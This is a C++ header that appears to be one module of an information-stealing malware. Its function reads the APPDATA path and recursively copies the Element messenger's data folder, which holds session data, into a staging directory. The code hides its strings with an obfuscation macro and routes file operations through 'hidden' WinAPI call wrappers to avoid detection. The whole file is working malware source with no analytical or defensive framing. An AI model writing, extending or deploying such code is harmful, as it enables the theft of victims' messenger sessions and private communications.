#ifndef ELEMENT_HPP
#define ELEMENT_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include "Winapi_Structs.hpp"
#include "obfusheader.h"

namespace fs = std::filesystem;

namespace Element {
    inline void Extract(const std::string& baseDir) {
        char* roamingPath = nullptr;
        size_t requiredSize = 0;
        _dupenv_s(&roamingPath, &requiredSize, OBF("APPDATA"));

        if (!roamingPath) return;

        std::string elementDir = std::string(roamingPath) + OBF("\\Element");
        free(roamingPath);

        if (!fs::exists(elementDir)) return;

        std::string targetDir = baseDir + OBF("\\Element");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        for (const auto& entry : fs::recursive_directory_iterator(elementDir)) {
            std::string destPath = targetDir + "\\" + entry.path().filename().string();
            if (fs::is_directory(entry)) {
                HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);
            }
            else {
                HiddenCalls::CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
            }
        }
    }
}

#endif
